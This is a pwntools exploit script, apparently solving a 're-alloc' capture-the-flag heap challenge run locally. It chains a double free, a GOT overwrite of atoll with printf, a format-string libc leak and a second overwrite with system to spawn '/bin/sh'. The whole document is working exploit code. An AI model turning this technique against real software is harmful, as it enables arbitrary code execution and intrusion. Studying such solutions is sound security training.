#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

printf_plt = 0x401070

atoll_got = 0x404048

def allocate(idx, size, data=None):
    p.sendlineafter('choice: ', str(1))
    p.sendlineafter('Index:', str(idx))
    p.sendlineafter('Size:', str(size))
    if data != None:
        p.sendafter('Data:', data)

def reallocate(idx, size, data=None):
    p.sendlineafter('choice: ', str(2))
    p.sendlineafter('Index:', str(idx))
    p.sendlineafter('Size:', str(size))
    if data != None:
        p.sendafter('Data:', data)

def rfree(idx, isBytes=False):
    p.sendlineafter('choice: ', str(3))
    if isBytes == False:
        p.sendlineafter('Index:', str(idx))
    else:
        p.sendlineafter('Index:', idx)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
p = process('./re-alloc')


# Double free attack
writehere = atoll_got
allocate(1, 0x10, b'a'*0x10) # heap[1] = malloc(0x10)
reallocate(1, 0) # free(heap[1])
rfree(1) # free(heap[1]), heap[1] = 0
allocate(0, 0x10, p64(writehere).ljust(0x10, b'\x87')) # heap[0] = malloc(0x10)
rfree(1) # malloc(0), garbage
payload = p64(printf_plt)
allocate(1, 0x10, payload[:0x7]) # heap[1] = malloc(0x10), arbitrary write

# Leak libc
rfree('%7$p')
libc.address = int(p.recvuntil('\n', drop=True), 16) - libc.symbols['_IO_2_1_stdout_']
print('libc: {:#x}'.format(libc.address))

# Double free attack again with Format string attack
reallocate('\0', '%95x', '\0') # heap[0] = realloc(heap[0], 0x60)
reallocate('\0', '\0') # free(heap[0])
rfree('\0') # free(heap[0]), heap[0] = 0
allocate('\0', '%95x', p64(writehere) + b'\0') # heap[0] = malloc(0x60)
rfree(b'%9$nxxxx' + p64(0x4040d0), isBytes=True) # Clear heap[0] by fmt str attack
allocate('\0', '%95x', p64(writehere) + b'\0') # heap[0] = malloc(0x60), garbage
rfree(b'%9$nxxxx' + p64(0x4040d0), isBytes=True) # Clear heap[0] by fmt str attack
payload = p64(libc.symbols['system'])
allocate('\0', '%95x', payload[:0x7]) # heap[0] = malloc(0x60), arbitrary write

rfree(b'/bin/sh\0', isBytes=True) # system('/bin/sh')

p.interactive()
